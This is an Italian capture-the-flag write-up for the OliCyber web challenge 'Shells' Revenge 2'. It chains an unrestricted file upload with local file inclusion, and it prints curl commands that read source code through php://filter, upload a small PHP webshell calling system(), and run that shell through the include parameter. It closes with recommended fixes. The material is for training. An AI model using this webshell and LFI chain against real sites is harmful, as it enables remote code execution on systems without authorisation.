# Shells' Revenge 2

**Competizione:** OliCyber <br>
**Categoria:** Web <br>
**URL:** http://shellrevenge2.challs.olicyber.it

---

## Descrizione
> Seconda versione di Shells' Revenge
La flag si ottiene eseguendo il comando /getflag

Il sito introduce un parametro `page` per includere pagine dinamicamente.

---

## Soluzione

### 1. Ricognizione iniziale

La pagina principale mostra un form con `action="index.php?page=upload.php"`. Il parametro `page` è sospetto, potrebbe essere una LFI.

Leggiamo i sorgenti tramite il wrapper PHP base64:

```bash
curl -s "http://shellrevenge2.challs.olicyber.it/index.php?page=php://filter/convert.base64-encode/resource=index.php"
curl -s "http://shellrevenge2.challs.olicyber.it/index.php?page=php://filter/convert.base64-encode/resource=upload.php"
```

### 2. Analisi dei sorgenti

**index.php:**
```php
include($_GET["page"]);
```

Nessun filtro, LFI totale su qualsiasi file del filesystem.

**upload.php** (filtri rilevanti):
```php
$name = basename($_FILES['file']['name']);
$name = htmlspecialchars($name);

if ($_FILES['file']['size'] > 100) {
    $err = 'size';
} else {
    move_uploaded_file($_FILES['file']['tmp_name'], $des);
}
```

- Nessun filtro sull'estensione
- Limite di 100 byte sul file
- Directory upload: `uploads/md5(REMOTE_ADDR)/`

### 3. Vulnerabilità — File Upload + LFI = RCE

La combinazione delle due vulnerabilità permette RCE:

1. Uploadiamo una webshell PHP ≤100 byte
2. La includiamo tramite LFI per eseguirla

### 4. Exploit

**Creazione webshell (28 byte):**

```bash
echo '<?php system("/getflag"); ?>' > shell.php
```

**Upload:**

```bash
curl -s -X POST "http://shellrevenge2.challs.olicyber.it/index.php?page=upload.php" \
  -F "file=@shell.php" \
  -F "submit=Invia"
```

Risposta: `Upload completato! /uploads/f6043818345fdff6227e343cb137620e/shell.php`

**Esecuzione via LFI:**

```bash
curl -s "http://shellrevenge2.challs.olicyber.it/index.php?page=uploads/f6043818345fdff6227e343cb137620e/shell.php"
```

---

## Flag

```
flag{...}
```

---

## Conclusioni

La vulnerabilità è la combinazione di **Unrestricted File Upload** e **Local File Inclusion**:

- `upload.php` non filtra l'estensione → possiamo caricare `.php`
- `index.php` include qualsiasi file senza restrizioni → possiamo includere il file caricato ed eseguirlo

**Fix corretto:**
- Validare l'estensione lato server (whitelist)
- Non usare input utente direttamente in `include()`, usare una mappa statica di pagine permesse
- Salvare i file upload fuori dalla document root o con estensione non eseguibile